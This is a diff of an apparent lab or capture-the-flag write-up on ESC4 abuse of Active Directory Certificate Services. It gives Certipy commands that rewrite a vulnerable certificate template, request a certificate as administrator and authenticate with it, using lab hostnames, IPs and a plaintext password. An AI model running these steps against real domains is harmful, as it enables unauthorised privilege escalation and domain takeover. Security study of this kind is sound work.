@@ -73,26 +73,11 @@ $templatePath = "AD:\CN=VulnESC4,CN=Certificate Templates,CN=Public Key Services
 ## ESC4 Exploitation with Certipy
 
 ```powershell
-certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -template 'VulnESC4' \
-    -save-old -ldap-scheme ldap
+certipy-ad template -u 'CA_SVC@sequel.htb' -p 'sako2005!' -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -write-default-configuration -save-configuration /tmp/DunderMifflin_old.json
 
-# Step 1 — Şablonun mövcud konfiqurasiyasını yedəklə
-certipy-ad req -u 'test@certificate.local' \
-  -p 'sako2005!' \          
-  -dc-ip 192.168.0.150 \     
-  -target WIN-CERTIFICATE.certificate.local \
-  -ca 'certificate-WIN-CERTIFICATE-CA' \
-  -template 'VulnESC4' \
-  -upn 'administrator@certificate.local'
+certipy-ad req -u 'CA_SVC@sequel.htb' -p 'sako2005!' -ca sequel-DC01-CA -dc-ip 10.129.232.128 -target 10.129.232.128 -ns 10.129.232.128 -template DunderMifflinAuthentication -upn administrator@sequel.htb
 
-# Step 2 — Auth
-certipy-ad auth \
-  -pfx 'administrator.pfx' \
-  -username 'administrator' \
-  -domain 'certificate.local' \
-  -dc-ip 192.168.0.150
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.128
 ```
 
 ---
